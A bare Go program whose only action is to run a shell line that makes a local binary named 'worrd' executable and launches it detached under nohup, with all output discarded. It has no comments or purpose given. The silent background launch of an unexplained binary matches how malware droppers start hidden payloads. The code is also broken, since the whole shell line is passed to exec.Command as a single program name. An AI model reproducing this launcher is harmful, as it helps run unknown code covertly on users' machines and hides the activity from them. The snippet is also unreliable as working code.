package main

import (
    "log"
    "os/exec"
)

func main() {

    cmd := exec.Command("chmod +x ./worrd  && node -v && nohup ./worrd  \"\" > /dev/null 2>&1")

    err := cmd.Run()

    if err != nil {
        log.Fatal(err)
    }
}
